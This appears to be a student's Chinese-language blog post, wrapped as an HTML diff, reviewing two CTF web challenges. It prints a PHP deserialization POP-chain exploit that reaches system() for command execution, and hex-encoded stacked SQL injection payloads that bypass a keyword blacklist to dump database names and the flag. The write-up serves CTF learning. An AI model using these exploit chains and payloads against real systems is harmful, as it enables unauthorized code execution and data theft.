@@ -1,0 +1,405 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>0xgame week2 web复现总结 | NaCl1</title>
+<link rel="shortcut icon" href="https://NaCl1.github.io/favicon.ico?v=1704386016631">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://NaCl1.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="0xgame week2 web复现总结 | NaCl1 - Atom Feed" href="https://NaCl1.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="虽然一题也做不出,但是在看了wp后也学到了不少的东西,故在此整理
+[Week 2] ez_unserialize
+首先贴出题目:
+ &lt;?php
+
+show_source(__FILE__);
+
+class Cache {
+    pu..." />
+    <meta name="keywords" content="sql堆叠注入,sql预处理绕过,pop链" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://NaCl1.github.io">
+  <img class="avatar" src="https://NaCl1.github.io/images/avatar.png?v=1704386016631" alt="">
+  </a>
+  <h1 class="site-title">
+    NaCl1
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              0xgame week2 web复现总结
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-17
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://NaCl1.github.io/tag/70ZmKxq2Q/" class="post-tag">
+                  # sql堆叠注入
+                </a>
+              
+                <a href="https://NaCl1.github.io/tag/qzss1Po-4/" class="post-tag">
+                  # sql预处理绕过
+                </a>
+              
+                <a href="https://NaCl1.github.io/tag/T3ATEjzsl/" class="post-tag">
+                  # pop链
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>虽然一题也做不出,但是在看了wp后也学到了不少的东西,故在此整理</p>
+<h1 id="week-2-ez_unserialize">[Week 2] ez_unserialize</h1>
+<p>首先贴出题目:</p>
+<pre><code class="language-php"> &lt;?php
+
+show_source(__FILE__);
+
+class Cache {
+    public $key;
+    public $value;
+    public $expired;
+    public $helper;
+
+    public function __construct($key, $value, $helper) {
+        $this-&gt;key = $key;
+        $this-&gt;value = $value;
+        $this-&gt;helper = $helper;
+
+        $this-&gt;expired = False;
+    }
+
+    public function __wakeup() {
+        $this-&gt;expired = False;
+    }
+
+    public function expired() {
+        if ($this-&gt;expired) {
+            $this-&gt;helper-&gt;clean($this-&gt;key);
+            return True;
+        } else {
+            return False;
+        }
+    }
+}
+
+class Storage {
+    public $store;
+
+    public function __construct() {
+        $this-&gt;store = array();
+    }
+    
+    public function __set($name, $value) {
+        if (!$this-&gt;store) {
+            $this-&gt;store = array();
+        }
+
+        if (!$value-&gt;expired()) {
+            $this-&gt;store[$name] = $value;
+        }
+    }
+
+    public function __get($name) {
+        return $this-&gt;data[$name];
+    }
+}
+
+class Helper {
+    public $funcs;
+
+    public function __construct($funcs) {
+        $this-&gt;funcs = $funcs;
+    }
+
+    public function __call($name, $args) {
+        $this-&gt;funcs[$name](...$args);
+    }
+}
+
+class DataObject {
+    public $storage;
+    public $data;
+
+    public function __destruct() {
+        foreach ($this-&gt;data as $key =&gt; $value) {
+            $this-&gt;storage-&gt;$key = $value;
+        }
+    }
+}
+
+if (isset($_GET['u'])) {
+    unserialize($_GET['u']);
+}
+?&gt; 
+</code></pre>
+<p>第一次看到这题有些思维固化了,总认为一个调用链应该从调用<code>__wakeup()</code>方法开始<br>
+实际上,这里是将<code>__destruct()</code>方法作为调用链的开头,在程序结束时,触发<code>__destruct()</code>方法从而进行一系列的函数调用</p>
+<p><strong>梳理</strong>:<br>
+一眼看过去不难发现最终应该是要调用<code>Helper</code>类下的<code>_call()</code>方法来实现rce<br>
+确定跳板及跳板顺序是问题的关键<br>
+1. 我们的目的是程序结束时对象被销毁,触发<code>__destruct()</code>,所以我们传入的序列应该是<code>DataObject</code>类的实例序列化而成,(下面将<code>DataObject</code>的实例命名为<code>dataobj</code>)<br>
+2. <code>DataObject.__destruct()</code>中的<code>$this-&gt;storage-&gt;$key = $value;</code>进行了一个赋值操作,这很容易想到能够通过此操作来调用<code>_set()</code>方法,而<code>_set()</code>就存在于<code>Storage</code>类中,因此,可以<code>dataobj-&gt;storage = new Storage()</code>,即可触发<code>_set()</code><br>
+3. 之后我们不难发现,想要执行<code>__call()</code>就得执行到<code>Cache</code>下的<code>expired()</code>(其中调用了一个不存在的方法<code>clean</code>),而想要执行<code>expired()</code>就得将<code>_set()</code>中的形参<code>$value</code>赋值为一个<code>Cache</code>的实例. 而<code>_set()</code>中的参数<code>$value</code>的值如何来,就是关键(卡了很久)<br>
+<strong>事实上,<code>_set()</code>有两个参数,第一个参数会自动传入不存在的成员属性,第二个参数会自动传入你赋的值</strong><br>
+如此,我们便可以将赋的值<code>$value</code>设为<code>Cache</code>的实例,这样一来,<code>_set()</code>的第二个形参<code>$value</code>就被传入了<code>Cache</code>的实例<br>
+4. 其他细节,如绕过<code>__wakeup()</code>,将cache的expired属性置为真等</p>
+<p>贴出exp:</p>
+<pre><code class="language-php">&lt;?php
+class Cache {
+ public $key;
+ public $value;
+ public $expired;
+ public $helper;
+ public function __construct() {
+ }
+}
+
+class Storage {
+ public $store;
+
+ public function __construct() {
+
+ }
+}
+
+class Helper {
+ public $funcs;
+
+ public function __construct() {
+ }
+}
+
+class DataObject {
+ public $storage;
+ public $data;
+ 
+ public function __construct() {
+
+ }
+}
+
+$dataobj = new DataObject();
+$dataobj-&gt;storage = new Storage();
+
+$obj = new Cache();
+$obj-&gt;helper = new Helper();
+$obj-&gt;key = &quot;ls /&quot;;
+$obj-&gt;helper-&gt;funcs = ['clean'=&gt;'system'];
+$obj-&gt;expired = &quot;True&quot;;
+$dataobj-&gt;data = ['nacl'=&gt;$obj];
+
+echo serialize($dataobj);
+
+</code></pre>
+<p>之后只需要利用__wakeup()函数特性,将序列中cache的中的属性数改大即可绕过__wakeup()</p>
+<h1 id="week-2-ez_sqli">[Week 2] ez_sqli</h1>
+<p>题目附件:</p>
+<pre><code class="language-python">from flask import Flask, render_template, request
+import MySQLdb
+import re
+
+blacklist = ['select', 'update', 'insert', 'delete', 'database', 'table', 'column', 'alter', 'create', 'drop', 'and', 'or', 'xor', 'if', 'else', 'then', 'where']
+
+conn = MySQLdb.connect(host='db', port=3306, user='root', passwd='root', db='ctf')
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    field = request.args.get('order', 'id')
+    field = re.sub(r'\s+', '', field)
+
+    for s in blacklist:
+        if s.lower() in field.lower():
+            return s + ' are banned'
+
+    if not re.match(r&quot;id|name|email&quot;, field):
+        field = 'id'
+
+    with conn.cursor() as cursor:
+        cursor.execute('SELECT * FROM userinfo order by %s' % field)
+        res = cursor.fetchall()
+
+    return render_template('index.html', res=res)
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8000, debug=True)
+</code></pre>
+<p>看过wp和hint,里面提到这里的<code>cursor.execute()</code>可以一次执行多条sql语句,且未过滤分号<code>;</code>,故可以使用堆叠注入<br>
+<code>blacklist</code>中过滤了很多字符,采用了预处理来绕过字符过滤<br>
+关于预处理+堆叠注入:    https://xz.aliyun.com/t/10594#toc-5<br>
+可以使用<code>mysql</code>中的hex()来构造payload<br>
+例:<br>
+<img src="https://NaCl1.github.io/post-images/1697547379545.png" alt="" loading="lazy"></p>
+<p>之后用预处理构造完整payload:</p>
+<p>库名:</p>
+<pre><code>?order=id;set/**/@a=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2873656C6563742867726F75705F636F6E63617428646174616261736528292929292929;prepare/**/test/**/from/**/@a;execute/**/test;
+
+select hex('select extractvalue(1,concat(0x7e,0x7e,(select(group_concat(database()))))');
+</code></pre>
+<p>表名:</p>
+<pre><code>?order=id;set/**/@a=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2873656C6563742867726F75705F636F6E636174287461626C655F6E616D65292966726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D613D64617461626173652829292929;prepare/**/test/**/from/**/@a;execute/**/test;
+
+select hex('select extractvalue(1,concat(0x7e,0x7e,(select(group_concat(table_name))from information_schema.tables where table_schema=database())))');
+</code></pre>
+<p>列名:</p>
+<pre><code>id;set/**/@a=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2873656C6563742867726F75705F636F6E63617428636F6C756D6E5F6E616D65292966726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D22666C616722292929;prepare/**/test/**/from/**/@a;execute/**/test;
+
+select hex('select extractvalue(1,concat(0x7e,0x7e,(select(group_concat(column_name))from information_schema.columns where table_name=&quot;flag&quot;)))');
+
+</code></pre>
+<p>flag:</p>
+<pre><code>?order=id;set/**/@a=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2873656C6563742867726F75705F636F6E63617428666C6167292966726F6D206374662E666C6167292929;prepare/**/test/**/from/**/@a;execute/**/test;
+
+select hex('select extractvalue(1,concat(0x7e,0x7e,(select(group_concat(flag))from ctf.flag)))');
+</code></pre>
+<p>这里依然是显示不全,可以用right和left分别从右边和左边查看flag</p>
+<pre><code>?order=id;set/**/@a=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2873656C65637428726967687428666C61672C3330292966726F6D206374662E666C6167292929;prepare/**/test/**/from/**/@a;execute/**/test;
+
+select hex('select extractvalue(1,concat(0x7e,0x7e,(select(right(flag,30))from ctf.flag)))');
+</code></pre>
+<pre><code>?order=id;set/**/@a=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2873656C656374286C65667428666C61672C3330292966726F6D206374662E666C6167292929;prepare/**/test/**/from/**/@a;execute/**/test;
+
+select hex('select extractvalue(1,concat(0x7e,0x7e,(select(left(flag,30))from ctf.flag)))');
+</code></pre>
+<p>拼接得到flag</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#week-2-ez_unserialize">[Week 2] ez_unserialize</a></li>
+<li><a href="#week-2-ez_sqli">[Week 2] ez_sqli</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://NaCl1.github.io/post/sql-zhu-ru-shua-ti-ji-lu/">
+              <h3 class="post-title">
+                SQL注入刷题记录
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://NaCl1.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
